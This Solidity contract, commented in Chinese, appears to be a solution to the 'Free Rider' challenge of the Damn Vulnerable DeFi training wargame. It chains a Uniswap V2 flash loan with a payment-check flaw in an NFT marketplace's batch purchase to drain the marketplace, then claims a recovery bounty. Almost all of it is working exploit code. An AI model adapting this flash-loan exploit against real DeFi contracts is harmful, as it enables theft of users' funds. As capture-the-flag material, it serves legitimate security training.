// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import {Test, console} from "forge-std/Test.sol";

contract FreeRiderExploit is IERC721Receiver {
    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;
    address recoveryManagerOwner;
    address player;

    uint256 immutable NFT_PRICE;
    uint256 immutable AMOUNT_OF_NFTS;

    constructor(
        WETH _weth,
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft,
        FreeRiderRecoveryManager _recoveryManager,
        address _recoveryManagerOwner,
        uint256  _NFT_PRICE,
        uint256  _AMOUNT_OF_NFTS
    ) payable {
        weth = _weth;
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = _nft;
        recoveryManager = _recoveryManager;
        recoveryManagerOwner = _recoveryManagerOwner;
        player = msg.sender;
        NFT_PRICE = _NFT_PRICE;
        AMOUNT_OF_NFTS = _AMOUNT_OF_NFTS;
        
    }

    function rescue() public {
        // ?? swap闪电贷逻辑
        // 借贷出 15 WETH 
        // data不使用
        uniswapPair.swap(NFT_PRICE, 0, address(this), "0x00");
        // 执行完后：
        // this balance: 75 ether
        //      palyer : 45 ether
        console.log("this eth: %e", address(this).balance);
        console.log("player eth: %e", address(player).balance);
        // + 75 ether
        payable(player).transfer(address(this).balance);
    }

    // uniswapPair.swap 会回调该函数
    function uniswapV2Call(
        address sender, 
        uint amount0,  // token0借款数量 
        uint amount1,   
        bytes calldata data) 
        public 
    {
        uint256[] memory nftIds = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            nftIds[i] = i;
        }
        // 闪电贷借到 15 ether 
        // WETH 转换为 ETH 
        // (ETH: 0 ether)
        weth.withdraw(weth.balanceOf(address(this)));
        // (ETH: 15 ether)
        // 进行批量购买，有漏洞，会发送 75 ether
        marketplace.buyMany{value: NFT_PRICE}(nftIds);
        // (ETH: 15 + 6 * 15 = 90 ether)
  
        // 通过 
        for(uint256 i = 0; i < nftIds.length; i++) {
            // 使用 safeTransferFrom ，才能执行onERC721Received 获得 45ETH
            // 当transferFrom调用者为拥有者时，无需 approve
            // data编码 - 奖励接收地址
            nft.safeTransferFrom(address(this), address(recoveryManager), nftIds[i], abi.encode(player));
        }   

        // 归还 15 ETH + 0.3% 手续费 （？？手续费计算）
        uint256 payback = amount0 + 0.05 ether ;
        // 转换为 WETH
        weth.deposit{value: payback}();
        
        weth.transfer(address(uniswapPair), payback);
        // (ETH: 75 ether)
    }

    // nft合约回调
    // 通过 buyMany 购买并接收 NFT 到合约时需要调用
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory _data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() payable external {}
}